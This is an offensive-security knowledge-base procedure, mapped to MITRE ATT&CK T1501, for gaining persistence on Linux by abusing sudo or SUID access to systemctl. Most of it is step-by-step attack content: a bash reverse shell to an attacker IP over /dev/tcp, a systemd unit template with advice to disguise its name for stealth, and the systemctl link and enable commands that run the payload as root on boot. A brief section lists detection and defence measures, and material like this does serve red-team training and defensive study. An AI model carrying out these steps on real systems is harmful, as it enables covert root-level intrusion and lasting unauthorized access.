---
id: 62ba11f0-2245-4d79-8d83-65851c6c8999
type: procedure
verified: true
submitted: true
created_at: '2019-10-16T23:21:22.795888+00:00'
updated_at: '2023-05-26T00:45:16.496725+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - '[[techniques/Systemd Service|T1501 - Systemd Service]]'
sub_techniques: []
tags:
  - '[[tags/Service Attacks]]'
commands:
  - '[[commands/systemctl-link-service-unit-file]]'
  - '[[commands/systemctl-enable-and-start-service-by-file]]'
platforms:
  - Linux
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Create-Systemd-Service-for-Persistence

## Summary

This procedure exploits configurations where systemctl is accessible via sudo privileges or SUID to create a malicious systemd service unit file. The service executes a payload, such as a reverse shell, to establish persistence and potentially gain root-level access on a Linux target.

## Description

Systemd is the init system on most modern Linux distributions, managing services and requiring root privileges for operations like enabling or starting services. If an attacker has sudo access to systemctl (e.g., via misconfigured sudoers) or if systemctl has SUID bit set, they can create and activate a custom service unit file that runs arbitrary code as root. This technique is used for persistence by embedding a payload in the service's ExecStart directive, ensuring it runs on boot or manually. The approach is stealthy if the service description is innocuous, but it leaves artifacts like symlinks in /etc/systemd/system. This maps to MITRE ATT&CK T1501 for systemd service hijacking in persistence scenarios.

## Requirements

1. Sudo access to systemctl (e.g., user can run 'sudo systemctl' without password) or SUID on systemctl binary.
2. Write access to a temporary directory like /tmp for staging the payload and unit file.
3. Network access for reverse shell payloads (outbound TCP to attacker's listener).
4. Target running systemd (most Linux distros post-2015, e.g., Ubuntu 18+, CentOS 7+).

## Defense

Defensive measures and detection strategies:

- Restrict sudo access to systemctl; use 'sudo -l' audits to identify over-privileged users.
- Monitor for new symlinks in /etc/systemd/system via file integrity monitoring (e.g., AIDE, OSSEC).
- Enable systemd auditing with auditd rules for service creation/enable events.
- Scan for SUID on systemctl: 'find /usr -perm -4000 -name systemctl 2>/dev/null'.
- Network monitoring for unexpected outbound connections from root processes.

## Objectives

1. Create and stage a payload executable on the target.
2. Define a systemd service unit that executes the payload as root.
3. Link, enable, and start the service to achieve persistence and shell access.
4. Verify execution without immediate detection.

## Instructions

### Step 1: Stage the Payload Script

**Context**: Create a simple reverse shell payload and save it to a temporary file. This will be executed by the service. Use full paths in the script to avoid issues with relative paths in systemd.

**Code** ([[codes/Bash-TCP-Reverse-Shell]]):

```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1'
```

> Save this code to /tmp/rootshell after substituting $ATTACKER_IP and $ATTACKER_PORT with your listener details (e.g., 192.168.1.100 and 4444). Make it executable with 'chmod +x /tmp/rootshell'. Expected output: No direct output; the file is staged for later execution.

### Step 2: Create the Systemd Service Unit File

**Context**: Define the service configuration in a .service file. This includes the unit description, service type, and the ExecStart command pointing to the payload. Use 'Type=simple' or 'notify' for reliability; full paths are mandatory in ExecStart to prevent failures.

**Code** ([[codes/Systemd-Service-Unit-Template-for-Payload]]):

```ini
[Unit]
Description=rootshell
[Service]
Type=notify
ExecStart=/bin/bash -c /tmp/rootshell
[Install]
WantedBy=multi-user.target
```

> Save this to /tmp/root.service. Customize Description for stealth (e.g., 'System Update Service'). Expected output: File created; verify with 'cat /tmp/root.service' showing the ini structure.

### Step 3: Link the Service Unit File

**Context**: Link the temporary unit file to the systemd directory so it can be managed by systemctl. This creates symlinks for enabling.

**Command** ([[commands/systemctl-link-service-unit-file]]):

```bash
sudo systemctl link $FULL_PATH_TO_FILE
```

> Replace $FULL_PATH_TO_FILE with /tmp/root.service. This step prepares the service for enabling without moving the file. Expected output: Symlink creation confirmation.

### Step 4: Enable and Start the Service

**Context**: Enable the service to run on boot and start it immediately for testing. The --now flag combines enable and start.

**Command** ([[commands/systemctl-enable-and-start-service-by-file]]):

```bash
sudo systemctl enable --now $FULL_PATH_TO_FILE
```

> Use /tmp/root.service as $FULL_PATH_TO_FILE. Expected output: Symlinks created and service started; check status with 'sudo systemctl status root.service' to confirm running.
